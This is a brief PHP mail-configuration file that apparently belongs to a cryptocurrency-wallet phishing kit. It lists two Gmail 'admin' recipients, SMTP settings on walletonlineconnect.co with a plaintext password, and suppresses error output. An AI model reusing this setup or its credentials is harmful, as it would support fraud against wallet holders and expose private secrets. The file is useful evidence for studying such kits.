<?php

error_reporting(0);

return [
    'admin_emails' => ["Denniswills0001@gmail.com","Bouldenana4love@gmail.com"],

    'SMTP_HOST' => 'walletonlineconnect.co',
    'SMTP_PORT' => 465,
    'SMTP_USERNAME' => 'support@walletonlineconnect.co',
    'SMTP_PASSWORD' => 'Passw0rd.com',
    'MAIL_SENDER_ADDRESS' => 'support@walletonlineconnect.co',
];
